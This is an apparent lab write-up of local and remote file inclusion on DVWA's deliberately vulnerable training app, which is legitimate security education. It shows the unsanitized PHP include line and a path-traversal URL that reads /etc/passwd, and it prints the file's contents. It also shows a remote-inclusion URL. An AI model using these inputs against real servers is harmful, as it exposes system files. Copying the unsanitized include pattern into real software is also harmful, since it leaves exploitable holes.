# Local File Inclusion (Level = Low)

- Visit the URL of the DVWA. Add the following credentials admin/password.
- Change the security level of the DVWA to Low.
- Go to the local file inclusion activity area.

## Local File Inclusion (Activity 1)
"To include a file edit the ?page=index.php in the URL to determine which file is included."

Web URL = http://DVWA_IP/vulnerabilities/fi/?page=include.php

Analyses of the web URL, shows that the web application is accessing include.php page which showed the message "To include a file edit the ?page=index.php in the URL to determine which file is included.".
This means that the page that we want to access is passed within the GET function.
For proving this, Go to "View Source" tab at the right bottom corner of the application to see the page source code and the functions of the PHP.
<?php

    $file = $_GET['page']; //The page we wish to display 

?>

The next step in the exploitation is to change the page parameter in the web URL to see the behavior of the web page.
For this modify the URL by including any garbage value.

http://DVWA_IP/vulnerabilities/fi/?page=iaassssdddff

The web page showed some error messages after entering garbage value in the page parameter.

Warning: include(sssss) [function.include]: failed to open stream: No such file or directory in /opt/lampp/htdocs/vulnerabilities/fi/index.php on line 35

Warning: include() [function.include]: Failed opening 'sssss' for inclusion (include_path='.:/opt/lampp/lib/php:../../external/phpids/0.6/lib/') in /opt/lampp/htdocs/vulnerabilities/fi/index.php on line 35

From the error messages, it has been identified that the lookup directory for accessing the files is /opt/lampp/htdocs/vulnerabilities/fi/

That means the current working directory is the "fi" directory. Now try to perform path traversal to go to the root directory of the operating system.

URL = http://DVWA_IP/vulnerabilities/fi/?page=../../../../../etc/passwd

When this URL is sent to the web server, it returned the contents of the /etc/passwd file.

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh syslog:x:101:103::/home/syslog:/bin/false dvwa:x:1000:1000:dvwa,,,:/home/dvwa:/bin/bash sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin messagebus:x:103:110::/var/run/dbus:/bin/false usbmux:x:104:46:usbmux daemon,,,:/home/usbmux:/bin/false pulse:x:105:111:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit:x:106:113:RealtimeKit,,,:/proc:/bin/false

This the example of local file inclusion where we perform path traversal techniques to include the file from local system in the URL parameters through the vulnerable web application.

We can also access other files within the filesystem such as /etc/hostname and files in other directories as well.

### Performing Remote File Inclusion
The remote file inclusion can also be performed by adding the URL of some other website such as https://google.com or some other server to access the file remotely.

URL = http://DVWA_IP/vulnerabilities/fi/?page=https://google.com

The URL will add Google's search bar within the DVWA web page, although the search bar isn't working but the page is accessed.














